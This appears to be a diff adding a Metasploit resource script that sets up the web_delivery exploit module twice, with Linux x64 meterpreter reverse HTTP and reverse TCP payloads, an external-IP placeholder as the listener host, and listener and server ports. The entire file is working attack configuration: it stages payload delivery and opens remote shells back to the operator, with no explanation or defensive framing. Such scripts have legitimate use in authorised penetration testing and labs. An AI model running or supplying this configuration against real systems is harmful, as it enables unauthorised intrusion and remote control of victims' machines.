@@ -1,0 +1,19 @@
+use exploit/multi/script/web_delivery
+set LHOST {EXTERNAL_IP}
+show targets
+set target 6
+set payload linux/x64/meterpreter_reverse_http
+set URIPATH delivery_http
+set LURI handler
+set LPORT 80
+set ReverseListenerBindPort 4444
+set SRVPORT 8080
+run
+
+set payload linux/x64/meterpreter_reverse_tcp
+set URIPATH delivery_tcp
+set LPORT 8888
+set ReverseListenerBindPort 4445
+set SRVPORT 8081
+run
+
